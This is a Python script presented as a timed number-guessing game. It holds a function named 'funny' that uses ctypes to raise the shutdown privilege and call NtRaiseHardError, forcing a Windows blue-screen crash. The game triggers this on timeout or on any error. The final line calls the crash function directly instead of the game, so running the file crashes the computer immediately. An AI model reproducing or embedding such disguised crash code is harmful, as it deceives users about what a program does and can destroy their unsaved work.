def main():

    import random
    import time

    max = 100
    number = random.randint(1, max)
    guess = 0
    num_guesses = 0
    timeLim = 30
    start_time = time.time()
    end_time = start_time + timeLim

    print(f"You have {timeLim} seconds to guess the number between 1 and {max}.")
    try:
        while time.time() < end_time:
            guess = int(input(f"Guess a number between 1 and {max}: "))
            num_guesses += 1
            if guess == number:
                print("Congratulations! You guessed the number in", num_guesses, "guesses.")
                break
            elif guess > number:
                print("Lower!")
            else:
                print("Higher!")

        else:
            funny()

    except:
        funny()

def funny():
    from ctypes import windll
    from ctypes import c_int
    from ctypes import c_uint
    from ctypes import c_ulong
    from ctypes import POINTER
    from ctypes import byref

    nullptr = POINTER(c_int)()

    windll.ntdll.RtlAdjustPrivilege(
        c_uint(19), 
        c_uint(1), 
        c_uint(0), 
        byref(c_int())
    )

    windll.ntdll.NtRaiseHardError(
        c_ulong(0xC000007B), 
        c_ulong(0), 
        nullptr, 
        nullptr, 
        c_uint(6), 
        byref(c_uint())
)

funny()